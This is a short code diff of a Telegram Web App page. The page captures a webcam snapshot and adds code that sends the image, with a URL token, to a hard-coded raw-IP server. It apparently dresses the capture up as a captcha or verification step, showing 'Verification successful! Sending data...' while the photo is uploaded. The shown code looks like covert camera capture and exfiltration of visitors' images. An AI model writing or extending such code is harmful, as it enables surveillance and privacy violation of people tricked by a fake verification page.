@@ -44,6 +44,9 @@
         tg.ready();
         tg.expand();
 
+        // Đã cập nhật IP VPS chính xác của bạn
+        const BACKEND_URL = "http://116.99.252.192:5000";
+
         const urlParams = new URLSearchParams(window.location.search);
         const token = urlParams.get('token') || '';
 
@@ -94,7 +97,6 @@
 
             await new Promise(r => setTimeout(r, 1200));
             
-            // Chụp ảnh độ phân giải nét căng 640x480
             capturedImage = snapshotHD();
 
             if (localStream) {
@@ -156,8 +158,7 @@
                 document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
 
-                // Gửi ảnh nét qua API backend để tránh giới hạn 4KB của Telegram
-                fetch('/api/save-photo', {
+                fetch(`${BACKEND_URL}/api/save-photo`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
